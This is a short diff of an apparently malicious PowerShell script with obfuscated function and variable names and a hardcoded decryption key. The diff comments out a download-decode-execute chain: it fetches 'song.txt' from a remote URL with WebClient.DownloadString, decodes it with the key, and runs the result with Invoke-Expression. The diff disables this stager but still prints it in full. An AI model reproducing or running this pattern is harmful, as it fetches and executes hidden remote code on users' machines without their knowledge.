@@ -30,10 +30,10 @@ function getinfo
 	$Key = "YnOxYSB2Rk4mkTnsvl9ijw=="
 	$endtag = "song.txt"
 	$downpsurl = $rfvwd + $endtag
-	$codestring = (New-Object System.Net.WebClient).DownloadString($downpsurl)
-	$comletter = DecodeString -obfString $codestring -Key $Key
+	#$codestring = (New-Object System.Net.WebClient).DownloadString($downpsurl)
+	#$comletter = DecodeString -obfString $codestring -Key $Key
 	
-	$result = Invoke-Expression $comletter	
+	#$result = Invoke-Expression $comletter	
 }
 
 function lkjeiwe
